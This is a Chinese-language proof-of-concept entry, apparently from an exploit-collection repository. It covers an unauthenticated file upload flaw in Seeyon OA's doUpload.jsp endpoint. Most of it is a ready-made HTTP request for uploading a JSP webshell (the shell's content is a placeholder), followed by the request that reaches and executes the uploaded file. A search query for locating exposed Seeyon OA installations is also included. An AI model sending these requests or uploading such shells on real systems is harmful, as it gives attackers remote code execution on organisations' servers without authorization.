---
source: "R4gd0ll/I-Wanna-Get-All"
---

# 致远OA yyoa doUpload.jsp 任意文件上传漏洞

## 漏洞描述

致远OA 的 `/yyoa/portal/tools/doUpload.jsp` 接口未授权即可上传文件，攻击者可直接上传 JSP 文件并访问执行，实现远程代码执行。

## 漏洞复现

```
POST /yyoa/portal/tools/doUpload.jsp HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=59229605f98b8cf290a7b8908b34616b
SL-CE-SUID: 89

--59229605f98b8cf290a7b8908b34616b
Content-Disposition: form-data; name="myfile"; filename="R4g.jsp"
Content-Type: application/octet-stream

<文件内容，如 JSP webshell>
--59229605f98b8cf290a7b8908b34616b--
```

响应状态码为 200 且响应体包含 `.jsp` 即上传成功，从响应中提取返回的文件名，访问：

```
GET /yyoa/portal/upload/<返回的文件名> HTTP/1.1
```

返回 200 即文件可被直接访问执行。

## 网络测绘

```
app="致远互联-OA"
```

## 参考链接

- 利用细节依据 R4gd0ll/I-Wanna-Get-All 历史提交 `d8b866a` 中 `seeyon_yyoa_doUpload_upload` 的 PoC 逻辑。
